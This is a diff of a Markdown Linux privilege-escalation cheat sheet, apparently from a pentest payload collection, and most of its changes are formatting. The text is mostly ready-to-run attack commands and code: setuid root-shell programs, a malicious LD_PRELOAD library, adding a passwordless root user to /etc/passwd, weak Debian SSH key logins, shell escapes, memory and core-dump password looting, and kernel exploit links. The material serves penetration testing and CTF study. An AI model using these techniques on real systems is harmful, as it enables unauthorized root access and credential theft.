@@ -43,19 +43,18 @@
     * [LXC/LXD](#lxclxd)
 * [Hijack TMUX session](#hijack-tmux-session)
 * [Kernel Exploits](#kernel-exploits)
-    * [CVE-2022-0847 (DirtyPipe)](#cve-2022-0847-dirtypipe)	
+    * [CVE-2022-0847 (DirtyPipe)](#cve-2022-0847-dirtypipe)
     * [CVE-2016-5195 (DirtyCow)](#cve-2016-5195-dirtycow)
     * [CVE-2010-3904 (RDS)](#cve-2010-3904-rds)
     * [CVE-2010-4258 (Full Nelson)](#cve-2010-4258-full-nelson)
     * [CVE-2012-0056 (Mempodipper)](#cve-2012-0056-mempodipper)
-
 
 ## Tools
 
 There are many scripts that you can execute on a linux machine which automatically enumerate sytem information, processes, and files to locate privilege escalation vectors.
 Here are a few:
 
-- [LinPEAS - Linux Privilege Escalation Awesome Script](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
+* [LinPEAS - Linux Privilege Escalation Awesome Script](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
 
     ```powershell
     wget "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" -O linpeas.sh
@@ -64,8 +63,8 @@ Here are a few:
     ./linpeas.sh -s #superfast & stealth - This will bypass some time consuming checks. In stealth mode Nothing will be written to the disk.
     ./linpeas.sh -P #Password - Pass a password that will be used with sudo -l and bruteforcing other users
     ```
-    
-- [LinuxSmartEnumeration - Linux enumeration tools for pentesting and CTFs](https://github.com/diego-treitos/linux-smart-enumeration)
+
+* [LinuxSmartEnumeration - Linux enumeration tools for pentesting and CTFs](https://github.com/diego-treitos/linux-smart-enumeration)
 
     ```powershell
     wget "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -O lse.sh
@@ -74,90 +73,89 @@ Here are a few:
     ./lse.sh -l2 # dump all the information it gathers about the system
     ```
 
-- [LinEnum - Scripted Local Linux Enumeration & Privilege Escalation Checks](https://github.com/rebootuser/LinEnum)
-    
+* [LinEnum - Scripted Local Linux Enumeration & Privilege Escalation Checks](https://github.com/rebootuser/LinEnum)
+
     ```powershell
     ./LinEnum.sh -s -k keyword -r report -e /tmp/ -t
     ```
 
-- [BeRoot - Privilege Escalation Project - Windows / Linux / Mac](https://github.com/AlessandroZ/BeRoot)
-- [linuxprivchecker.py - a Linux Privilege Escalation Check Script](https://github.com/sleventyeleven/linuxprivchecker)
-- [unix-privesc-check - Automatically exported from code.google.com/p/unix-privesc-check](https://github.com/pentestmonkey/unix-privesc-check)
-- [Privilege Escalation through sudo - Linux](https://github.com/TH3xACE/SUDO_KILLER)
-
+* [BeRoot - Privilege Escalation Project - Windows / Linux / Mac](https://github.com/AlessandroZ/BeRoot)
+* [linuxprivchecker.py - a Linux Privilege Escalation Check Script](https://github.com/sleventyeleven/linuxprivchecker)
+* [unix-privesc-check - Automatically exported from code.google.com/p/unix-privesc-check](https://github.com/pentestmonkey/unix-privesc-check)
+* [Privilege Escalation through sudo - Linux](https://github.com/TH3xACE/SUDO_KILLER)
 
 ## Checklists
 
 * Kernel and distribution release details
 * System Information:
-  * Hostname
-  * Networking details:
-  * Current IP
-  * Default route details
-  * DNS server information
+    * Hostname
+    * Networking details:
+    * Current IP
+    * Default route details
+    * DNS server information
 * User Information:
-  * Current user details
-  * Last logged on users
-  * Shows users logged onto the host
-  * List all users including uid/gid information
-  * List root accounts
-  * Extracts password policies and hash storage method information
-  * Checks umask value
-  * Checks if password hashes are stored in /etc/passwd
-  * Extract full details for 'default' uid's such as 0, 1000, 1001 etc
-  * Attempt to read restricted files i.e. /etc/shadow
-  * List current users history files (i.e .bash_history, .nano_history, .mysql_history , etc.)
-  * Basic SSH checks
+    * Current user details
+    * Last logged on users
+    * Shows users logged onto the host
+    * List all users including uid/gid information
+    * List root accounts
+    * Extracts password policies and hash storage method information
+    * Checks umask value
+    * Checks if password hashes are stored in /etc/passwd
+    * Extract full details for 'default' uid's such as 0, 1000, 1001 etc
+    * Attempt to read restricted files i.e. /etc/shadow
+    * List current users history files (i.e .bash_history, .nano_history, .mysql_history , etc.)
+    * Basic SSH checks
 * Privileged access:
-  * Which users have recently used sudo
-  * Determine if /etc/sudoers is accessible
-  * Determine if the current user has Sudo access without a password
-  * Are known 'good' breakout binaries available via Sudo (i.e. nmap, vim etc.)
-  * Is root's home directory accessible
-  * List permissions for /home/
+    * Which users have recently used sudo
+    * Determine if /etc/sudoers is accessible
+    * Determine if the current user has Sudo access without a password
+    * Are known 'good' breakout binaries available via Sudo (i.e. nmap, vim etc.)
+    * Is root's home directory accessible
+    * List permissions for /home/
 * Environmental:
-  * Display current $PATH
-  * Displays env information
+    * Display current $PATH
+    * Displays env information
 * Jobs/Tasks:
-  * List all cron jobs
-  * Locate all world-writable cron jobs
-  * Locate cron jobs owned by other users of the system
-  * List the active and inactive systemd timers
+    * List all cron jobs
+    * Locate all world-writable cron jobs
+    * Locate cron jobs owned by other users of the system
+    * List the active and inactive systemd timers
 * Services:
-  * List network connections (TCP & UDP)
-  * List running processes
-  * Lookup and list process binaries and associated permissions
-  * List inetd.conf/xined.conf contents and associated binary file permissions
-  * List init.d binary permissions
+    * List network connections (TCP & UDP)
+    * List running processes
+    * Lookup and list process binaries and associated permissions
+    * List inetd.conf/xined.conf contents and associated binary file permissions
+    * List init.d binary permissions
 * Version Information (of the following):
-  * Sudo
-  * MYSQL
-  * Postgres
-  * Apache
-    * Checks user config
-    * Shows enabled modules
-    * Checks for htpasswd files
-    * View www directories
+    * Sudo
+    * MYSQL
+    * Postgres
+    * Apache
+        * Checks user config
+        * Shows enabled modules
+        * Checks for htpasswd files
+        * View www directories
 * Default/Weak Credentials:
-  * Checks for default/weak Postgres accounts
-  * Checks for default/weak MYSQL accounts
+    * Checks for default/weak Postgres accounts
+    * Checks for default/weak MYSQL accounts
 * Searches:
-  * Locate all SUID/GUID files
-  * Locate all world-writable SUID/GUID files
-  * Locate all SUID/GUID files owned by root
-  * Locate 'interesting' SUID/GUID files (i.e. nmap, vim etc)
-  * Locate files with POSIX capabilities
-  * List all world-writable files
-  * Find/list all accessible *.plan files and display contents
-  * Find/list all accessible *.rhosts files and display contents
-  * Show NFS server details
-  * Locate *.conf and *.log files containing keyword supplied at script runtime
-  * List all *.conf files located in /etc
-  * Locate mail
+    * Locate all SUID/GUID files
+    * Locate all world-writable SUID/GUID files
+    * Locate all SUID/GUID files owned by root
+    * Locate 'interesting' SUID/GUID files (i.e. nmap, vim etc)
+    * Locate files with POSIX capabilities
+    * List all world-writable files
+    * Find/list all accessible *.plan files and display contents
+    * Find/list all accessible *.rhosts files and display contents
+    * Show NFS server details
+    * Locate *.conf and*.log files containing keyword supplied at script runtime
+    * List all *.conf files located in /etc
+    * Locate mail
 * Platform/software specific tests:
-  * Checks to determine if we're in a Docker container
-  * Checks to see if the host has Docker installed
-  * Checks to determine if we're in an LXC container
+    * Checks to determine if we're in a Docker container
+    * Checks to see if the host has Docker installed
+    * Checks to determine if we're in an LXC container
 
 ## Looting for passwords
 
@@ -172,8 +170,7 @@ find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
 
 The `/etc/security/opasswd` file is used also by pam_cracklib to keep the history of old passwords so that the user will not reuse them.
 
-:warning: Treat your opasswd file like your /etc/shadow file because it will end up containing user password hashes 
-
+:warning: Treat your opasswd file like your /etc/shadow file because it will end up containing user password hashes
 
 ### Last edited files
 
@@ -185,8 +182,23 @@ find / -mmin -10 2>/dev/null | grep -Ev "^/proc"
 
 ### In memory passwords
 
+**Memory**:
+
 ```powershell
 strings /dev/mem -n10 | grep -i PASS
+```
+
+**Core Dump**:
+
+```ps1
+# Find PID
+ps -eo pid,command
+
+# Core dump PID
+gcore <pid> -o dumpfile
+
+# Search for passwords
+strings -n 5 dumpfile | grep -i pass
 ```
 
 ### Find sensitive files
@@ -201,42 +213,43 @@ $ locate password | more
 ...
 ```
 
-
 ### Preseed
 
 A preseed.cfg file is used in Debian-based Linux distributions to automate the installation process. It contains answers to the questions that the installer normally asks, allowing for a fully unattended installation. This file can specify configurations such as partitioning schemes, package selections, network settings, and user accounts.
 
 * Root password in clear text
+
   ```ps1
   d-i passwd/root-password password root_password_123
   d-i passwd/root-password-again password root_password_123
   ```
 
 * Root password encrypted using an MD5 hash
+
   ```ps1
   d-i passwd/root-password-crypted password $1$DhSfFtNS$v/Eb.KsQkTq8nKIX1.B8n.
   ```
 
 * Normal user's password in clear text
+
   ```ps1
   d-i passwd/user-password password my_password_123
   d-i passwd/user-password-again password my_password_123
   ```
 
 * Normal user's password encrypted using an MD5 hash
+
   ```ps1
   d-i passwd/user-password-crypted password $1$DgJMNO1/$BqfY2C5y00p0yhpApPmmJ1
   ```
-
 
 ## SSH Key
 
 ### Sensitive files
 
-```
+```ps1
 find / -name authorized_keys 2> /dev/null
 find / -name id_rsa 2> /dev/null
-...
 ```
 
 ### SSH Key Predictable PRNG (Authorized_Keys) Process
@@ -247,38 +260,38 @@ Needed : SSH-DSS String from authorized_keys file
 
 **Steps**
 
-1. Get the authorized_keys file. An example of this file would look like so:
+Get the authorized_keys file. An example of this file would look like so:
 
-```
+```ps1
 ssh-dss AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834ybf ... (snipped) ... 
 ```
 
-2. Since this is an ssh-dss key, we need to add that to our local copy of `/etc/ssh/ssh_config` and `/etc/ssh/sshd_config`:
+Since this is an ssh-dss key, we need to add that to our local copy of `/etc/ssh/ssh_config` and `/etc/ssh/sshd_config`:
 
-```
+```ps1
 echo "PubkeyAcceptedKeyTypes=+ssh-dss" >> /etc/ssh/ssh_config
 echo "PubkeyAcceptedKeyTypes=+ssh-dss" >> /etc/ssh/sshd_config
 /etc/init.d/ssh restart
 ```
 
-3. Get [g0tmi1k's debian-ssh repository](https://github.com/g0tmi1k/debian-ssh) and unpack the keys:
+Get [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh) and unpack the keys:
 
-```
+```ps1
 git clone https://github.com/g0tmi1k/debian-ssh
 cd debian-ssh
 tar vjxf common_keys/debian_ssh_dsa_1024_x86.tar.bz2
 ```
 
-4. Grab the first 20 or 30 bytes from the key file shown above starting with the `"AAAA..."` portion and grep the unpacked keys with it as:
+Grab the first 20 or 30 bytes from the key file shown above starting with the `"AAAA..."` portion and grep the unpacked keys with it as:
 
-```
+```ps1
 grep -lr 'AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834ybf'
 dsa/1024/68b329da9893e34099c7d8ad5cb9c940-17934.pub
 ```
 
-5. IF SUCCESSFUL, this will return a file (68b329da9893e34099c7d8ad5cb9c940-17934.pub) public file. To use the private key file to connect, drop the '.pub' extension and do:
+IF SUCCESSFUL, this will return a file (68b329da9893e34099c7d8ad5cb9c940-17934.pub) public file. To use the private key file to connect, drop the '.pub' extension and do:
 
-```
+```ps1
 ssh -vvv victim@target -i 68b329da9893e34099c7d8ad5cb9c940-17934
 ```
 
@@ -288,8 +301,8 @@ And you should connect without requiring a password. If stuck, the `-vvv` verbos
 
 ### Cron jobs
 
-Check if you have access with write permission on these files.   
-Check inside the file, to find other paths with write permissions.   
+Check if you have access with write permission on these files.
+Check inside the file, to find other paths with write permissions.
 
 ```powershell
 /etc/init.d
@@ -325,7 +338,6 @@ You can use [pspy](https://github.com/DominicBreuker/pspy) to detect a CRON job.
 # print both commands and file system events and scan procfs every 1000 ms (=1sec)
 ./pspy64 -pf -i 1000 
 ```
-
 
 ## Systemd timers
 
@@ -364,7 +376,6 @@ find / -uid 0 -perm -4000 -type f 2>/dev/null
 | setuid()   | sets the effective user ID of the calling process        |
 | setgid()   | sets the effective group ID of the calling process       |
 
-
 ```bash
 print 'int main(void){\nsetresuid(0, 0, 0);\nsystem("/bin/sh");\n}' > /tmp/suid.c   
 gcc -o /tmp/suid /tmp/suid.c  
@@ -372,10 +383,9 @@ sudo chmod +x /tmp/suid # execute right
 sudo chmod +s /tmp/suid # setuid bit
 ```
 
-
 ## Capabilities
 
-### List capabilities of binaries 
+### List capabilities of binaries
 
 ```powershell
 ╭─swissky@lab ~  
@@ -399,6 +409,7 @@ sudo chmod +s /tmp/suid # setuid bit
 ### Interesting capabilities
 
 Having the capability =ep means the binary has all the capabilities.
+
 ```powershell
 $ getcap openssl /usr/bin/openssl 
 openssl=ep
@@ -477,10 +488,10 @@ Compile the following shared object using the C code below with `gcc -fPIC -shar
 #include <stdlib.h>
 #include <unistd.h>
 void _init() {
-	unsetenv("LD_PRELOAD");
-	setgid(0);
-	setuid(0);
-	system("/bin/sh");
+ unsetenv("LD_PRELOAD");
+ setgid(0);
+ setuid(0);
+ system("/bin/sh");
 }
 ```
 
@@ -512,7 +523,6 @@ uid=0(root) gid=0(root) groups=0(root)
 
 Slides of the presentation : [https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf](https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf)
 
-
 ### CVE-2019-14287
 
 ```powershell
@@ -530,11 +540,10 @@ sudo -u#4294967295 id
 
 The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.
 
-> gdb -nx -ex '!sh' -ex quit    
-> sudo mysql -e '\! /bin/sh'    
-> strace -o /dev/null /bin/sh    
+> gdb -nx -ex '!sh' -ex quit
+> sudo mysql -e '\! /bin/sh'
+> strace -o /dev/null /bin/sh
 > sudo awk 'BEGIN {system("/bin/sh")}'
-
 
 ## Wildcard
 
@@ -574,6 +583,7 @@ DEVICE=eth0
 EXEC :
 ./etc/sysconfig/network-scripts/ifcfg-1337
 ```
+
 src : [https://vulmon.com/exploitdetailsqidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
 
 ### Writable /etc/passwd
@@ -596,7 +606,7 @@ E.g: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`
 
 You can now use the `su` command with `hacker:hacker`
 
-Alternatively you can use the following lines to add a dummy user without a password.    
+Alternatively you can use the following lines to add a dummy user without a password.
 WARNING: you might degrade the current security of the machine.
 
 ```powershell
@@ -604,7 +614,7 @@ echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
 su - dummy
 ```
 
-NOTE: In BSD platforms `/etc/passwd` is located at `/etc/pwd.db` and `/etc/master.passwd`, also the `/etc/shadow` is renamed to `/etc/spwd.db`. 
+NOTE: In BSD platforms `/etc/passwd` is located at `/etc/pwd.db` and `/etc/master.passwd`, also the `/etc/shadow` is renamed to `/etc/spwd.db`.
 
 ### Writable /etc/sudoers
 
@@ -632,10 +642,10 @@ mount -t nfs 10.10.10.10:/shared /tmp/nfsdir
 cd /tmp/nfsdir
 
 # copy wanted shell 
-cp /bin/bash . 	
+cp /bin/bash .  
 
 # set suid permission
-chmod +s bash 	
+chmod +s bash  
 ```
 
 ## Shared Library
@@ -773,8 +783,7 @@ lxc start mycontainer
 lxc exec mycontainer /bin/sh
 ```
 
-Alternatively https://github.com/initstring/lxd_root
-
+Alternatively <https://github.com/initstring/lxd_root>
 
 ## Hijack TMUX session
 
@@ -785,25 +794,23 @@ export TMUX=/tmp/tmux-1000/default,1234,0
 tmux ls
 ```
 
-
 ## Kernel Exploits
 
 Precompiled exploits can be found inside these repositories, run them at your own risk !
+
 * [bin-sploits - @offensive-security](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits)
 * [kernel-exploits - @lucyoa](https://github.com/lucyoa/kernel-exploits/)
 
 The following exploits are known to work well, search for more exploits with `searchsploit -w linux kernel centos`.
 
 Another way to find a kernel exploit is to get the specific kernel version and linux distro of the machine by doing `uname -a`
-Copy the kernel version and distribution, and search for it in google or in https://www.exploit-db.com/.
+Copy the kernel version and distribution, and search for it in google or in <https://www.exploit-db.com/>.
 
 ### CVE-2022-0847 (DirtyPipe)
 
 Linux Privilege Escalation - Linux Kernel 5.8 < 5.16.11
 
-```
-https://www.exploit-db.com/exploits/50808
-```
+* [Lance Biggerstaff/2022-0847](https://www.exploit-db.com/exploits/50808)
 
 ### CVE-2016-5195 (DirtyCow)
 
@@ -841,19 +848,19 @@ Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)
 https://www.exploit-db.com/exploits/18411
 ```
 
-
 ## References
 
-- [SUID vs Capabilities - Dec 7, 2017 - Nick Void aka mn3m](https://mn3m.info/posts/suid-vs-capabilities/)
-- [Privilege escalation via Docker - April 22, 2015 - Chris Foster](https://fosterelli.co/privilege-escalation-via-docker.html)
-- [An Interesting Privilege Escalation vector (getcap/setcap) - NXNJZ - AUGUST 21, 2018](https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/)
-- [Exploiting wildcards on Linux - Berislav Kucan](https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/)
-- [Code Execution With Tar Command - p4pentest](http://p4pentest.in/2016/10/19/code-execution-with-tar-command/)
-- [Back To The Future: Unix Wildcards Gone Wild - Leon Juranic](http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt)
-- [HOW TO EXPLOIT WEAK NFS PERMISSIONS THROUGH PRIVILEGE ESCALATION? - APRIL 25, 2018](https://www.securitynewspaper.com/2018/04/25/use-weak-nfs-permissions-escalate-linux-privileges/)
-- [Privilege Escalation via lxd - @reboare](https://reboare.github.io/lxd/lxd-escape.html)
-- [Editing /etc/passwd File for Privilege Escalation - Raj Chandel - MAY 12, 2018](https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/)
-- [Privilege Escalation by injecting process possessing sudo tokens - @nongiach @chaignc](https://github.com/nongiach/sudo_inject)
+* [SUID vs Capabilities - Dec 7, 2017 - Nick Void aka mn3m](https://mn3m.info/posts/suid-vs-capabilities/)
+* [Privilege escalation via Docker - April 22, 2015 - Chris Foster](https://fosterelli.co/privilege-escalation-via-docker.html)
+* [An Interesting Privilege Escalation vector (getcap/setcap) - NXNJZ - AUGUST 21, 2018](https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/)
+* [Exploiting wildcards on Linux - Berislav Kucan](https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/)
+* [Code Execution With Tar Command - p4pentest](http://p4pentest.in/2016/10/19/code-execution-with-tar-command/)
+* [Back To The Future: Unix Wildcards Gone Wild - Leon Juranic](http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt)
+* [HOW TO EXPLOIT WEAK NFS PERMISSIONS THROUGH PRIVILEGE ESCALATION? - APRIL 25, 2018](https://www.securitynewspaper.com/2018/04/25/use-weak-nfs-permissions-escalate-linux-privileges/)
+* [Privilege Escalation via lxd - @reboare](https://reboare.github.io/lxd/lxd-escape.html)
+* [Editing /etc/passwd File for Privilege Escalation - Raj Chandel - MAY 12, 2018](https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/)
+* [Privilege Escalation by injecting process possessing sudo tokens - @nongiach @chaignc](https://github.com/nongiach/sudo_inject)
+
 * [Linux Password Security with pam_cracklib - Hal Pomeranz, Deer Run Associates](http://www.deer-run.com/~hal/sysadmin/pam_cracklib.html)
 * [Local Privilege Escalation Workshop - Slides.pdf - @sagishahar](https://github.com/sagishahar/lpeworkshop/blob/master/Local%20Privilege%20Escalation%20Workshop%20-%20Slides.pdf)
 * [SSH Key Predictable PRNG (Authorized_Keys) Process - @weaknetlabs](https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Vulnerabilities/SSH/key-exploit.md)
